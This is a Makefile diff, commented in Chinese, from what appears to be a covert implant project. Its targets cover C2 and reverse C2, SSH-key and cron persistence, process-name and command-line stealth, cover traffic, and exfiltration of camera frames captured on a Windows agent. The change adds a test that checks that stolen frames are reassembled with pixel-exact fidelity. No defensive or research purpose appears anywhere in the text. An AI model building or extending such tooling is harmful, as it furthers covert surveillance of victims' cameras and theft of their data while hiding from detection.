@@ -64,7 +64,7 @@ $(AGOBJS): FORCE
 
 FORCE:
 
-.PHONY: FORCE verify-cron-contract verify-v4l2-abi
+.PHONY: FORCE verify-cron-contract verify-v4l2-abi verify-exfil-fidelity
 
 $(BUILD)/exfil.o: src/exfil.c include/exfil.h | $(BUILD)
 	$(CC) $(CFLAGS) -c $< -o $@
@@ -139,6 +139,14 @@ $(BUILD)/dump_cells: tests/dump_cells.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(P
 # 端到端：agent_windows 采集 -> JPEG -> exfil 信元 -> 重组校验
 $(BUILD)/test_cam_e2e: tests/test_cam_e2e.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB) FORCE
 	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
+
+# 内容保真度：回传重组产物必须由外部真实解码器打开并与原始帧比对。
+# 单独成链（不并入 test_cam_e2e）：判据层次不同，字节一致与像素一致必须可分。
+$(BUILD)/test_exfil_fidelity: tests/test_exfil_fidelity.c $(BUILD)/exfil.o $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB) FORCE
+	$(CC) $(CFLAGS) $< $(BUILD)/exfil.o -o $@ $(LATLIB) $(C2OBJS) $(AGOBJS) $(P2PLIB)
+
+verify-exfil-fidelity: $(BUILD)/test_exfil_fidelity
+	@python3 tests/verify_exfil_fidelity.py
 
 # 自适应覆盖流量接入真实发送循环：提交 + 泵送（入队-出片交替）。
 # 依赖 14_p2p 的 mix/cover（libp2p.a）与 exfil 的 chan/link。
@@ -336,7 +344,7 @@ verify-redline:
 verify-redline-guard:
 	@python3 ../redline/redline_guard.py
 
-test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-svcname verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience verify-uninstall-unit verify-uninstall-busy verify-persist-selfheal verify-redline verify-redline-guard $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol verify-cron-contract verify-v4l2-abi
+test: verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-svcname verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience verify-uninstall-unit verify-uninstall-busy verify-persist-selfheal verify-redline verify-redline-guard $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit $(BUILD)/test_tol verify-cron-contract verify-v4l2-abi verify-exfil-fidelity
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -360,5 +368,5 @@ inspect: all
 clean:
 	rm -rf $(BUILD)
 
-.PHONY: all test clean inspect verify-persist-selfheal verify-redline verify-redline-guard verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-svcname verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience verify-uninstall-unit verify-v4l2-abi
+.PHONY: all test clean inspect verify-persist-selfheal verify-redline verify-redline-guard verify-upload verify-c2 verify-c2-reverse verify-tls-sink verify-onekey-sink verify-onekey-arch verify-onekey-front verify-sshkey-persist verify-svcname verify-cron-exec verify-prefix verify-name-stealth verify-cmdline-stealth verify-unit-contract verify-unit-contract-reverse verify-daemon-resilience verify-uninstall-unit verify-v4l2-abi verify-exfil-fidelity
 
